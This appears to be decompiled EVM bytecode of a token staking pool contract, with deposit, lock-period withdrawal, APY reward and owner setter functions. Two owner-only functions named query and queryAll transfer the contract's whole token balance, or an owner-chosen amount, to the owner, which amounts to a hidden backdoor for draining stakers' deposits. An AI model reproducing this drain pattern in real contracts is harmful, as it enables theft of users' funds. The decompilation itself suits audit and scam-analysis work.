contract main {




// =====================  Runtime code  =====================


address tokenAddress;
mapping of struct userInfo;
uint256 sub_10b04743;
uint256 APY;
uint256 startPool;
uint256 endPool;
address owner;

function sub_10b04743(?) payable {
    return sub_10b04743
}

function userInfo(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return userInfo[arg1].field_0, userInfo[arg1].field_256
}

function endPool() payable {
    return endPool
}

function owner() payable {
    return owner
}

function APY() payable {
    return APY
}

function startPool() payable {
    return startPool
}

function token() payable {
    return tokenAddress
}

function _fallback() payable {
    revert
}

function sub_a90bbb1e(?) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    endPool = arg1
}

function setAPY(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    APY = arg1
}

function setPoolOpenTime(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    startPool = arg1
}

function setLockPeriod(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    sub_10b04743 = arg1
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == owner
    owner = arg1
}

function queryAll() payable {
    require msg.sender == owner
    staticcall tokenAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    call tokenAddress.approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args this.address, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    call tokenAddress.0xa9059cbb with:
         gas gas_remaining wei
        args msg.sender, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function withdraw() payable {
    require userInfo[msg.sender].field_0
    if endPool > !sub_10b04743:
        revert with 0, 17
    if block.timestamp < endPool + sub_10b04743:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Can not withdraw token in lock token time'
    if not userInfo[msg.sender].field_0:
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, 0
    else:
        if userInfo[msg.sender].field_0 and APY > -1 / userInfo[msg.sender].field_0:
            revert with 0, 17
        if not userInfo[msg.sender].field_0:
            revert with 0, 18
        if userInfo[msg.sender].field_0 * APY / userInfo[msg.sender].field_0 != APY:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, userInfo[msg.sender].field_0 * APY / 100
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    userInfo[msg.sender].field_0 = 0
}

function query(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    staticcall tokenAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not arg1:
        require ext_call.return_data[0] > 0
        call tokenAddress.approve(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args this.address, 0
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == bool(ext_call.return_data[0])
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, 0
    else:
        if arg1 and 10^9 > -1 / arg1:
            revert with 0, 17
        if not arg1:
            revert with 0, 18
        if 10^9 * arg1 / arg1 != 10^9:
            revert with 0, 'SafeMath: multiplication overflow'
        require ext_call.return_data[0] > 10^9 * arg1
        call tokenAddress.approve(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args this.address, 10^9 * arg1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == bool(ext_call.return_data[0])
        call tokenAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, 10^9 * arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function deposit(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if arg1 <= 0:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Please deposit more than 0 tokens'
    if not arg1:
        if block.timestamp >= endPool:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        'can not stake any more after jan 26 23:00 utc timezone'
        if block.timestamp <= startPool:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'can not stake before pool open time'
        if userInfo[msg.sender].field_0 > -1:
            revert with 0, 17
        call tokenAddress.0x23b872dd with:
             gas gas_remaining wei
            args msg.sender, this.address, 0
    else:
        if arg1 and 10^9 > -1 / arg1:
            revert with 0, 17
        if not arg1:
            revert with 0, 18
        if 10^9 * arg1 / arg1 != 10^9:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        if block.timestamp >= endPool:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        'can not stake any more after jan 26 23:00 utc timezone'
        if block.timestamp <= startPool:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'can not stake before pool open time'
        if userInfo[msg.sender].field_0 > !(10^9 * arg1):
            revert with 0, 17
        userInfo[msg.sender].field_0 += 10^9 * arg1
        call tokenAddress.0x23b872dd with:
             gas gas_remaining wei
            args msg.sender, this.address, 10^9 * arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function calcCurrentReward(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if endPool > !sub_10b04743:
        revert with 0, 17
    if block.timestamp > endPool + sub_10b04743:
        if APY < 100:
            revert with 0, 17
        if not userInfo[address(arg1)].field_0:
            if not sub_10b04743:
                revert with 0, 'SafeMath: division by zero', 0
            return (0 / sub_10b04743)
        if userInfo[address(arg1)].field_0 and APY - 100 > -1 / userInfo[address(arg1)].field_0:
            revert with 0, 17
        if not userInfo[address(arg1)].field_0:
            revert with 0, 18
        if (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0) / userInfo[address(arg1)].field_0 != APY - 100:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        if not (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0):
            if not sub_10b04743:
                revert with 0, 'SafeMath: division by zero', 0
            return (0 / sub_10b04743)
        if (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0) and sub_10b04743 > -1 / (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0):
            revert with 0, 17
        if not (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0):
            revert with 0, 18
        if (-100 * userInfo[address(arg1)].field_0 * sub_10b04743) + (APY * userInfo[address(arg1)].field_0 * sub_10b04743) / (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0) != sub_10b04743:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        if not sub_10b04743:
            revert with 0, 'SafeMath: division by zero', 0
        return ((-100 * userInfo[address(arg1)].field_0 * sub_10b04743) + (APY * userInfo[address(arg1)].field_0 * sub_10b04743) / 100 / sub_10b04743)
    if block.timestamp < endPool:
        revert with 0, 17
    if APY < 100:
        revert with 0, 17
    if not userInfo[address(arg1)].field_0:
        if not sub_10b04743:
            revert with 0, 'SafeMath: division by zero', 0
        return (0 / sub_10b04743)
    if userInfo[address(arg1)].field_0 and APY - 100 > -1 / userInfo[address(arg1)].field_0:
        revert with 0, 17
    if not userInfo[address(arg1)].field_0:
        revert with 0, 18
    if (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0) / userInfo[address(arg1)].field_0 != APY - 100:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
    if not (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0):
        if not sub_10b04743:
            revert with 0, 'SafeMath: division by zero', 0
        return (0 / sub_10b04743)
    if (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0) and block.timestamp - endPool > -1 / (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0):
        revert with 0, 17
    if not (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0):
        revert with 0, 18
    if (-100 * block.timestamp * userInfo[address(arg1)].field_0) + (100 * endPool * userInfo[address(arg1)].field_0) + (block.timestamp * APY * userInfo[address(arg1)].field_0) - (endPool * APY * userInfo[address(arg1)].field_0) / (-100 * userInfo[address(arg1)].field_0) + (APY * userInfo[address(arg1)].field_0) != block.timestamp - endPool:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
    if not sub_10b04743:
        revert with 0, 'SafeMath: division by zero', 0
    return ((-100 * block.timestamp * userInfo[address(arg1)].field_0) + (100 * endPool * userInfo[address(arg1)].field_0) + (block.timestamp * APY * userInfo[address(arg1)].field_0) - (endPool * APY * userInfo[address(arg1)].field_0) / 100 / sub_10b04743)
}



}
